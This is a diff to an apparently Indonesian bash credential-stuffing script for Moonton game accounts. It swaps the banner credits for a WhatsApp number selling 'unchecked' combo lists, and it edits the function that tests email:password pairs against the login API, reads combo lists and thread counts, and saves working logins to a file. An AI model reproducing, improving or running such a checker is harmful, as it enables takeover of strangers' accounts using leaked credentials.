@@ -10,10 +10,11 @@ cat << "EOF"
          ____) |    | |____     | |  | |       | |   
         |_____/      \_____|    |_|  |_|       |_|   
        ===========================================  
-           ~  [+]Moonton Checker 2K20[+]    ~
-          ====================================
-          | YOUTUBE: Shinchan Tutorial       |
-          | IG     : @shinchanproject        |
+              !!! ALON ALON ASAL KELAKON !!!
+          ======================================
+          RECODE BOLEH YANG PENTING JANGAN DI 
+          JUAL BELIKAN ANJING :( !!!
+  WHATSAPP ME 083893242384 BELI UNCHEK PM AJA LER !!!
  =======================================================
 
 EOF
@@ -43,21 +44,21 @@ function check(){
 	local SESSION=$(echo $result | grep -Po "(?<=session\":\")[^\"]*")
 	local CODE=$(echo $result | grep -Po "(?<=code\":)[^,]*")
 	if [[ $STATUS =~ "Error_Success" ]]; then
-		printf "| ${OG}${B}LIVE${CC} | Email:${1} Password:${2} => [${TIME}]\n"
-		echo "${1}|${2}" >> Live.txt
+		printf "| ${OG}${B}LIVE${CC} | ${1}:${2} => [${PP}${TIME}]\n"
+		echo "${1}|${2}" >> Live.txtu
 	elif [[ $STATUS =~ "Error_PasswdError" ]]; then
-		printf "| ${BL}${B}PWSALAH${CC} | Email:${1} Password:${2} => [${TIME}]\n"
+		printf "| ${BL}${B}PWSALAH${CC} | ${1}:${2} => [${PP}${TIME}]\n"
 		echo "${1}|${2}" >> pwsalah.txt
 	elif [[ $STATUS =~ "Error_PwdErrorTooMany" ]]; then
-		printf "| ${YL}${B}TerlaluSering${CC} | Email:${1} Password:${2} => [${TIME}]\n"
+		printf "| ${YL}${B}TerlaluSering${CC} | ${1}:${2} => [${PP}${TIME}]\n"
 		echo "${1}|${2}" >> TerlaluSering.txt
 	elif [[ $STATUS =~ "Error_NoAccount" ]]; then
-	printf "| ${RD}${B}DIE${CC} | Email:${1} Password:${2} => [${TIME}]\n"
+	printf "| ${RD}${B}DIE${CC} | ${1}:${2} => [${TIME}]\n"
 	else
-		printf "| ${CY}${B}UNKNOWN${CC} | Email:${1} Password:${2} => [${TIME}]\n"
+		printf "| ${CY}${B}UNKNOWN${CC} | ${1}:${2} => [${PP}${TIME}]\n"
 	fi
 }
-echo -e "\e[1;35m"
+echo -e "\e[1;0;200m"
 read -p "List Empas [+]: " listempas
 read -p "Delimiter [+]: " delim
 read -p "Thread [+]: " persend
